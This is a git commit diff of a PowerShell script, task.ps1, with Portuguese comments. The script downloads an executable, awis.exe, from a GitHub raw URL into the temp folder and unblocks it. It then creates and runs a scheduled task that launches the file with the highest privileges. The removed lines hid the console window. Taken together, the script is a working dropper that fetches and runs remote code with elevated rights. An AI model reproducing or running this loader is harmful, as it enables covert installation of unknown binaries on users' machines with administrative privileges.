bf9e429ef8fbfb4624a326634e124c6123dc2158
user337666 <129235545+user337666@users.noreply.github.com>
2025-09-18 19:04:29 -0300

    Update task.ps1

--- task.ps1
+++ task.ps1
@@ -1,13 +1,8 @@
-# Esconder janela
-$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
-Add-Type -Name win -Member $t -Namespace native
-[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess()).MainWindowHandle, 0)
-
-# Criar tarefa agendada
+# Baixar e executar awis.exe com privilégios
 $u = "https://github.com/user337666/brow666/raw/refs/heads/main/awis.exe"
 $p = "$env:TEMP\awis.exe"
-iwr $u -o $p
-Unblock-File $p -ea 0
+Invoke-WebRequest $u -OutFile $p
+Unblock-File $p -ErrorAction SilentlyContinue
 schtasks /Create /TN "RunTask" /TR "powershell -c Start-Process $p" /SC ONCE /ST 00:00 /RL HIGHEST /F
 schtasks /Run /TN "RunTask"
 Start-Sleep -Seconds 10
